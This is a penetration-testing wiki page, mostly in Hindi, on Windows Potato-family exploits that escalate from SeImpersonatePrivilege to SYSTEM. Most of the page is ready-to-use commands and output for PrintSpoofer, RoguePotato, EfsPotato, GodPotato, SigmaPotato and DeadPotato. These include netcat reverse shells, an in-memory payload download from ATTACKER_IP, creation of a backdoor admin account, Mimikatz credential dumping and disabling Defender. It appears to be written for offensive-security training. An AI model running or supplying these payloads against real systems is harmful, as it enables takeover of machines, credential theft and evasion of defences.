# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato काम नहीं करता** Windows Server 2019 और Windows 10 build 1809 के बाद के संस्करणों पर। फिर भी, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान विशेषाधिकार हासिल करने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच प्राप्त करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` टूल पर गहराई से जानकारी देती है, जिसे उन Windows 10 और Server 2019 होस्ट्स पर impersonation privileges का दुरुपयोग करने के लिए इस्तेमाल किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।

> [!TIP]
> 2024–2025 में अक्सर मेंटेन किया जाने वाला एक आधुनिक विकल्प SigmaPotato है (GodPotato का fork) जो in-memory/.NET reflection उपयोग और विस्तारित OS सपोर्ट जोड़ता है। नीचे तीव्र उपयोग देखें और रेपो References में देखें।

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य समस्याएँ

निम्न सभी तकनीकें उस स्थिति पर निर्भर करती हैं जहाँ एक impersonation-capable privileged service का दुरुपयोग किया जा सके, और context के पास इन में से किसी एक privilege का होना आवश्यक है:

- SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
- अगर टोकन में पहले से SeImpersonatePrivilege मौजूद है तो high integrity आवश्यक नहीं है (यह कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए सामान्य है)

त्वरित रूप से privileges जांचें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशनल नोट्स:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer को Print Spooler service चलती और local RPC endpoint (spoolss) पर पहुँच योग्य होना चाहिए। hardened environments में जहाँ Spooler को PrintNightmare के बाद disable कर दिया गया हो, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato को OXID resolver चाहिए जो TCP/135 पर पहुँच योग्य हो। अगर egress blocked है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। Older builds में -f flag की जरूरत होती थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; अगर कोई pipe blocked है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आम तौर पर अज्ञात/असमर्थित RPC authentication service को दर्शाता है; अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही हो।
- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; slim originals की तुलना में EDR detection अधिक होने की उम्मीद रखें।

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप -i का उपयोग करके वर्तमान कंसोल में एक interactive process spawn कर सकते हैं, या -c से एक one-liner चला सकते हैं।
- Spooler सेवा आवश्यक है। यदि यह निष्क्रिय है, तो यह असफल होगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 ब्लॉक है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है जो 2022 के अंत में जारी हुआ और Spooler/BITS के बजाय **PrintNotify** service को लक्षित करता है। The binary PrintNotify COM server को instantiate करता है, fake `IUnknown` को swap करता है, फिर `CreatePointerMoniker` के माध्यम से एक privileged callback trigger करता है। जब PrintNotify service (running as **SYSTEM**) वापस कनेक्ट होती है, तो process returned token की duplicate करता है और दिए गए payload को full privileges के साथ spawn करता है।

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: अगर एक pipe फेल हो जाता है या EDR उसे ब्लॉक कर देता है, तो दूसरे supported pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
नोट्स:
- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato दो वेरिएंट प्रदान करता है जो service DCOM objects को लक्षित करते हैं जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर सेट होते हैं। उपलब्ध binaries का निर्माण करें या उनका उपयोग करें और अपना कमांड चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे .NET reflection के जरिए इन‑मेमोरी निष्पादन और PowerShell reverse shell सहायक।
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- इन-बिल्ट reverse shell flag `--revshell` और 1024-चर PowerShell सीमा को हटाया गया है ताकि आप लंबे AMSI-bypassing payloads एक ही बार में चला सकें।
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), साथ ही simple heuristics को गुमराह करने के लिए `VirtualAllocExNuma()` के जरिए एक rudimentary AV evasion trick।
- अलग `SigmaPotatoCore.exe` जो .NET 2.0 के खिलाफ compiled है, PowerShell Core environments के लिए।

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato GodPotato के OXID/DCOM impersonation chain को बनाए रखता है लेकिन इसमें post-exploitation helpers शामिल हैं ताकि ऑपरेटर बिना अतिरिक्त tooling के तुरंत SYSTEM ले सकें और persistence/collection कर सकें।

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM के रूप में arbitrary command spawn करें।
- `-rev <ip:port>` — quick reverse shell।
- `-newadmin user:pass` — persistence के लिए एक local admin बनाएं।
- `-mimi sam|lsa|all` — Mimikatz drop और run करके credentials dump करें (disk को छूता है, noisy)।
- `-sharphound` — SYSTEM के रूप में SharpHound collection चलाएं।
- `-defender off` — Defender real-time protection को बंद करें (बहुत noisy)।

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
क्योंकि यह अतिरिक्त binaries के साथ आता है, AV/EDR flags अधिक होने की उम्मीद रखें; जब stealth मायने रखता है तो हल्का GodPotato/SigmaPotato उपयोग करें।

## संदर्भ

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
